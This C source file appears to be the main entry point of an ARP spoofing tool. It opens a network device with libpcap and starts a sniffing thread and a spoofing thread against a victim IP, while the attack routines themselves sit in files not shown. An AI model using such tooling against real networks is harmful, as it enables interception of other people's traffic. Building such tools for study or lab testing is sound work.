#include <stdio.h>
#include <pcap.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include "packet.h"
#include "arp.h"

int GetMacflag=0;
int GetGateMacflag=0;
struct sniff_ethernet et_attack_packet;
struct sniff_ethernet et_gate_packet;
arphdr_t arp_attack_packet;

int main(int argc, char* argv[])
{
	char *dev, errbuf[PCAP_ERRBUF_SIZE];

	pthread_t threads[2];
	int thread_id[2];
	int status;

	if(argc != 2)
	{
		fprintf(stderr,"[*usage] ./arpspoof victim_ip\n");
		return -1;
	}

	dev = pcap_lookupdev(errbuf);
	if(dev == NULL)
	{
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return -1;
	}

	printf("Device: %s\n", dev);
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL)
	{
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}


	//create arp spoofing
	pthread_argv pargv;
	pargv.ip = argv[1];
	pargv.handle = handle;
	//create capture packet thread
	thread_id[0] = pthread_create(&threads[0], NULL, packet_sniffer_main, (void*)&pargv);
	if(thread_id[0] < 0)
	{
		fprintf(stderr,"packet capture thread create error\n");
		return -1;
	}


	thread_id[1] = pthread_create(&threads[1], NULL, arp_spoof_main, (void*)&pargv);
	if(thread_id[1] < 0)
	{
		fprintf(stderr,"arp_spoof thread create error \n");
		return -1;
	}

	//prevent jombie
	pthread_join(threads[0], (void**)&status);
	pthread_join(threads[1], (void**)&status);
	return 0;
}
